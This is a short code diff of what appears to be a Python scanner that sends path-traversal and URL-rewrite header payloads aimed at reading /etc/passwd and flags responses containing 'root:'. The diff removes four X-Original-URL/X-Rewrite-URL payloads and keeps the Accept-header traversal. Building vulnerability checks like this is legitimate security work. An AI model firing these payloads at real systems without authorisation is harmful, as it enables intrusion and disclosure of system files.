@@ -8,11 +8,7 @@ import sys
 def scan(host):
     try:
         payloads = {
-                'Accept ../../../../../../../../../../etc/passwd{{':'root:',
-                'X-Original-URL /etc/passwd':'root:',
-                'X-Original-URL ../../../../../../../etc/passwd':'root:',
-                'X-Rewrite-URL ../../../../../../../etc/passwd':'root:',
-                'X-Rewrite-URL /etc/passwd':'root:'
+                'Accept ../../../../../../../../../../etc/passwd{{':'root:'
         }
         for payload,msg in payloads.items():
             r = get(host,headers={payload.split(' ')[0]:payload.split(' ')[1]},verify=False,allow_redirects=False)
